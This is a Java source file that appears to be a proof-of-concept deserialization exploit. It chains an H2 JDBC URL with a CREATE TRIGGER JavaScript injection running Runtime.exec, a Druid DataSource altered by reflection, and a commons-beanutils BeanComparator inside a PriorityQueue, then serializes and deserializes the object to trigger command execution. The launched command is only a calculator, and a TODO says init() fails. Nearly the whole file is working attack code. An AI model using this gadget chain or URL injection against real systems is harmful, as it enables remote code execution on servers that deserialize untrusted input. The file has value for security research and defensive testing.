package druid.h2;

import com.alibaba.druid.pool.DruidAbstractDataSource;
import com.alibaba.druid.pool.DruidDataSource;
import com.alibaba.druid.util.Histogram;
import org.apache.commons.beanutils.BeanComparator;
import org.h2.Driver;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;
import java.util.PriorityQueue;

// TODO init() fail
public class DruidH2Sink {
    public static void main(String[] args) throws Exception {

        String command = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
                "$$\n";
        DruidDataSource dataSource = new DruidDataSource();

        Field field = DruidAbstractDataSource.class.getDeclaredField("transactionHistogram");
        field.setAccessible(true);
        field.set(dataSource,null);

        dataSource.setUrl(command);
        dataSource.init();

        setValue(dataSource,"initedLatch",null);
        dataSource.setLogWriter(null);
        dataSource.setStatLogger(null);

//        Field field3 = DruidAbstractDataSource.class.getDeclaredField("filters");
//        field3.setAccessible(true);
//        List list = new ArrayList<>();
//        list.add(null);
//        field3.set(dataSource,list);

        Field field2 = DruidAbstractDataSource.class.getDeclaredField("inited");
        field2.setAccessible(true);
        field2.set(dataSource,true);

        dataSource.setDriver(null);
        setValue(dataSource,"createConnectionThread",null);
        setValue(dataSource,"dataSourceStat",null);
        setValue(dataSource,"destroyConnectionThread",null);
        setValue(dataSource,"destroyTask",null);

        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        setValue(comparator, "property", "connection");
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = dataSource;
        queueArray[1] = dataSource;

        String fileName = "druid.ser";
        FileOutputStream fileOutputStream = new FileOutputStream(fileName);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(queue);

        FileInputStream fileInputStream = new FileInputStream(fileName);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }


    public static void setValue(Object obj, String name, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }
}
